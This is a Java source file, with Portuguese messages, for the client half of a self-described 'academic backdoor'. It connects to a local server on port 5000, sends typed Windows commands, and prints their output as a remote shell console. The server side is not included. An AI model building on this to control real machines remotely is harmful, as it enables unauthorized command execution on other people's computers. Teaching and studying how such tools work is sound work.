import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class Client {
    private static final String HOST = "127.0.0.1";
    private static final int PORT = 5000;

    public static void main(String[] args) {
        System.out.println("Cliente do Backdoor Acadêmico");
        System.out.println("Conectando em " + HOST + ":" + PORT);

        try (Socket socket = new Socket(HOST, PORT);
             BufferedReader in = new BufferedReader(
                     new InputStreamReader(
                             socket.getInputStream(),
                             StandardCharsets.UTF_8));
             BufferedWriter out = new BufferedWriter(
                     new OutputStreamWriter(
                             socket.getOutputStream(),
                             StandardCharsets.UTF_8));
             Scanner scanner =
                     new Scanner(System.in, StandardCharsets.UTF_8)) {

            System.out.println("Conectado.");
            System.out.println(
                    "Digite comandos do Windows. "
                    + "Use 'exit' ou 'quit' para sair.");

            while (true) {
                System.out.print("shell> ");

                String command = scanner.nextLine();

                out.write(command);
                out.newLine();
                out.flush();

                String line;

                while ((line = in.readLine()) != null) {

                    if (line.equals("<<<FIM_OUTPUT>>>")) {
                        break;
                    }

                    System.out.println(line);
                }

                if (command.equalsIgnoreCase("exit")
                        || command.equalsIgnoreCase("quit")) {
                    break;
                }
            }

        } catch (ConnectException e) {
            System.err.println("Não foi possível conectar.");
            System.err.println(
                    "Inicie o Server primeiro e tente novamente.");

        } catch (IOException e) {
            System.err.println("Erro: " + e.getMessage());
        }
    }
}